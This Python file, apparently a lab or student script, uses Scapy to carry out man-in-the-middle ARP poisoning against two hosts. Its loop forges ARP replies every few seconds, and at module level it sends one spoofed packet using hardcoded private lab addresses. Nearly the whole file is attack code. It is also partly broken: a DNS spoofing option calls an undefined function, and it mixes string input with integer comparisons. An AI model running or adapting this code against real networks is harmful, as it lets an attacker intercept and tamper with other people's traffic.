
# MITM ARP spoofing attack - using Scapy

# Imports
from scapy.all import *

# The main method to be ran by the user of our script
def main():
       typeOfAttack = input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: ")
       if (typeOfAttack == 1):
           arppoison()
       elif (typeOfAttack == 2): 
           dnsSpoof()
       else:
           print("No or wrong input.")

def arppoison():
    # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
    nrOfHosts = input("The number of hosts you want to ARP poison: ")

    # If number of hosts is less than 2, a while loop is instantiated which can only be left if the number of hosts becomes greater or equal than 2
    if (nrOfHosts < 2):
        print("A MITM ARP poisoning attack with less than 2 hosts is not possible.")
        print("The number of hosts you want to ARP poison: ")
        while (nrOfHosts < 2):
            nrOfHosts = input()

    macVictimList = []
    ipVictimList = []

    # The MAC and IP addresses of the victims and the attacker are obtained
    for i in range(nrOfHosts): 
        macVictimList.append(input("The MAC address of the " + i + "th victim:"))
        ipVictimList.append(input("The IP address of the " + i + "th victim:"))
    macAttacker = input("The MAC address of the attacker: ")
    ipAttacker = input("The IP address of the attacker: ")

    if (nrOfHosts == 2):

        # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
        while(True):
            # Send ARP package to victim 1 of spoofed IP victim 2
            arp1 = Ether() / ARP()
            arp1[Ether].src = macAttacker
            arp1[ARP].hwsrc = macAttacker
            arp1[ARP].psrc = ipVictimList[1]
            arp1[ARP].hwdst = macVictimList[0]
            arp1[ARP].pdst = ipVictimList[0]
            sendp(arp1, iface="enp0s3")

            # Send ARP package to victim 2 of spoofed IP victim 1
            arp2 = Ether() / ARP()
            arp2[Ether].src = macAttacker
            arp2[ARP].hwsrc = macAttacker
            arp2[ARP].psrc = ipVictimList[0]
            arp2[ARP].hwdst = macVictimList[1]
            arp2[ARP].pdst = ipVictimList[1]
            sendp(arp2, iface="enp0s3")

            # Timer
            time.sleep(3)

        #Forward packets: need to sniff for ARP packets constatnly, and send to other host when receiving one
        #threads

        # This would look something like this:
        # print(ipVictimList[0] + " sends a packet to " + ipVictimList[1])


macAttacker = "08:00:27:d0:25:4b"
ipAttacker = "192.168.56.103"
macVictim =  "08:00:27:b7:c4:af"
ipVictim = "192.168.56.101"

ipToSpoof = "192.168.56.102"

arp = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = ipToSpoof
arp[ARP].hwdst = macVictim
arp[ARP].pdst = ipVictim

sendp(arp, iface="enp0s3")